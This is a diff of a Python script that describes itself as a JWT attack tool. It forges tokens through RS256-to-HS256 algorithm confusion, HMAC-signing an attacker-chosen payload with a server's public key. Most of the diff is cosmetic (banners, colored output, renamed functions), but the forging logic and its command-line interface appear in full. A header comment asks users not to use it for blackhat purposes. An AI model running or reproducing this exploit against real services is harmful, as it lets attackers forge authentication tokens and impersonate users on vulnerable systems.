@@ -1,12 +1,14 @@
-#Plz Dont Use It For Black.Be A Good Man :D
-#لطفا برای اهداف سیاه از این ابزار استفاده نکنید . مرد خوبی باش 
-import jwt 
+#Plz Dont Use It for Blackhat , Be a Good Mate , Play Whitehat :D <3 Respect
+#pip install jwt
+#pip install termcolor
+#!/usr/bin/python3
+import jwt
 import os
 import base64
 import binascii
 import json
 import argparse
-
+from termcolor import colored
 
 def genPartialJWT(payload):
     encoded_jwt = jwt.encode(json.loads(payload), '', algorithm='HS256')
@@ -28,25 +30,29 @@ def buildJWT(sign, partial_jwt):
     new_jwt = partial_jwt + "." + b64_sign
     return new_jwt
 
-def main():
+def mainFunc():
     banner = """
-██████╗ ███████╗██████╗ ███████╗ ██████╗     ██████╗     ██╗  ██╗███████╗██████╗ ███████╗ ██████╗
-██╔══██╗██╔════╝╚════██╗██╔════╝██╔════╝     ╚════██╗    ██║  ██║██╔════╝╚════██╗██╔════╝██╔════╝
-██████╔╝███████╗ █████╔╝███████╗███████╗      █████╔╝    ███████║███████╗ █████╔╝███████╗███████╗
-██╔══██╗╚════██║██╔═══╝ ╚════██║██╔═══██╗    ██╔═══╝     ██╔══██║╚════██║██╔═══╝ ╚════██║██╔═══██╗
-██║  ██║███████║███████╗███████║╚██████╔╝    ███████╗    ██║  ██║███████║███████╗███████║╚██████╔╝
-╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝     ╚══════╝    ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝
-                                                                                      By: Hamidjk
+ _  .-')    .-')                                      .-') _                          ('-. .-.  .-')                                                 (`\ .-') /` .-') _    
+( \( -O )  ( OO ).                                   (  OO) )                        ( OO )  / ( OO ).                                                `.( OO ),'(  OO) )   
+ ,------. (_)---\_) .-----. .------.   ,--.          /     '._  .-'),-----.          ,--. ,--.(_)---\_) .-----. .------.   ,--.                ,--.,--./  .--.  /     '._  
+ |   /`. '/    _ | / ,-.   \|   ___|  /  .'     .-') |'--...__)( OO'  .-.  '   .-')  |  | |  |/    _ | / ,-.   \|   ___|  /  .'     .-')   .-')| ,||      |  |  |'--...__) 
+ |  /  | |\  :` `. '-'  |  ||  '--.  .  / -.  _(  OO)'--.  .--'/   |  | |  | _(  OO) |   .|  |\  :` `. '-'  |  ||  '--.  .  / -.  _(  OO) ( OO |(_||  |   |  |, '--.  .--' 
+ |  |_.' | '..`''.)   .'  / `---.  '.| .-.  '(,------.  |  |   \_) |  |\|  |(,------.|       | '..`''.)   .'  / `---.  '.| .-.  '(,------.| `-'|  ||  |.'.|  |_)   |  |    
+ |  .  '.'.-._)   \ .'  /__ .-   |  |' \  |  |'------'  |  |     \ |  | |  | '------'|  .-.  |.-._)   \ .'  /__ .-   |  |' \  |  |'------',--. |  ||         |     |  |    
+ |  |\  \ \       /|       || `-'   /\  `'  /           |  |      `'  '-'  '         |  | |  |\       /|       || `-'   /\  `'  /         |  '-'  /|   ,'.   |     |  |    
+ `--' '--' `-----' `-------' `----''  `----'            `--'        `-----'          `--' `--' `-----' `-------' `----''  `----'           `-----' '--'   '--'     `--'    
+                                                                                                                                                           ---Code By HamidJk
 """
     helpbanner = """
 ###############################################
     Tool for JWT attack algorithm
-    RS256 To HS256 Algo
+    RS256 to HS256
     Requisit:
-        - You Must have to know the public key Or Finding With GOOGLE DorK OR .... 
+        - You have to know or find the public key
 ###############################################
 """
-
+    print (colored(banner, "yellow"))
+    print (colored(helpbanner, "red"))
     parser = argparse.ArgumentParser()
     parser.add_argument('payload', help='JSON payload from legitim JWT')
     parser.add_argument('pubkey', help='Public key file to use for signing')
@@ -60,6 +66,6 @@ def main():
         hex_pub_key = genHexPubKey(pubkey)
         sign = signJWT(partial_jwt, hex_pub_key)
         new_jwt = buildJWT(sign, partial_jwt)
-        print (new_jwt)
+        print (colored(new_jwt,"green"))
 
-main()
+mainFunc()
